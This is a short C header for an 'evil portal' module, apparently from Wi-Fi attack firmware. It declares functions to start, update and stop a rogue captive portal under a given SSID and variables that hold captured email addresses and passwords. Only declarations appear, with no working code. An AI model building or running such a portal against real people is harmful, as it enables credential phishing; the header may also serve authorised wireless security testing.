#ifndef EVIL_PORTAL_H
#define EVIL_PORTAL_H

extern bool portalRunning;
extern bool isCaptured;
extern String capturedPassword;
extern String capturedEmail;

#define MAX_CLIENTS 4
#define WIFI_CHANNEL 6
#define DNS_INTERVAL 10

void updateCaptivePortal();
void stopCaptivePortal();
void startCaptivePortal(String* ssid, bool email_and_pass);

#endif